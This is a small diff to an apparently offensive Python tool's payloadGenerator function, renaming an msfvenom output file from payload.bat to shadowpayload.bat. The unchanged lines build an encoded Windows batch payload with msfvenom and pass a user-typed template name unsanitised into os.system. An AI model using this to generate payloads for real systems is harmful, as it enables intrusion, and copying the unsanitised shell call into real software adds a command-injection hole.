@@ -19,7 +19,7 @@ def payloadGenerator(mode):
         os.system("ls templates")
         template = input("\n─╼┤selection├─> ")
         print("\n")
-        command = "sudo msfvenom -p generic/custom PAYLOADFILE=templates/"+template+" -a x86 --platform win -e psbase NOEXIT SYSWOW64 -o payload.bat"
+        command = "sudo msfvenom -p generic/custom PAYLOADFILE=templates/"+template+" -a x86 --platform win -e psbase NOEXIT SYSWOW64 -o shadowpayload.bat"
         os.system(command)
         
     print("\n")
